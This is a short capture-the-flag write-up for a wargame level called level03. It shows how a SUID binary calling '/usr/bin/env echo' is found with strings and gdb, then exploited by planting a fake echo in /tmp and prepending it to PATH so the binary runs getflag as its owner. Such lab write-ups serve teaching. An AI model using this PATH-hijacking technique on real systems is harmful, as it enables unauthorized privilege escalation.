# Flag

For this flag, we can see that this user has an executable on his directory: "level03".
When executing it, it simply prints "Exploit me".
We can also see that the "SUID" bit is set, which means that this prgoram will be executed as it's owner. 
It's owner is "flag03", so if we can make it run the "getflag" or even "/bin/bash" we could get the flag or even become flag03!

doing "strings level03" lets us see that there is a line as follows: "/usr/bin/env echo Exploit me"
We can confirm that this is indeed being executed by using gdb or pwndbg:
```
gdb level03
(gdb) disassemble main
   ...
   0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   ...
(gdb) x/s 0x80485e0
0x80485e0:	"/usr/bin/env echo Exploit me"
```

As echo isn't hardcoded but rather relies on the PATH variable to determine what to run, we can modify the PATH environment variable to modify what echo does.
```
echo "getflag" > /tmp/echo
chmod 755 /tmp/echo
export PATH="/tmp:$PATH"
./level03
```

This gets us the flag! on to level04!
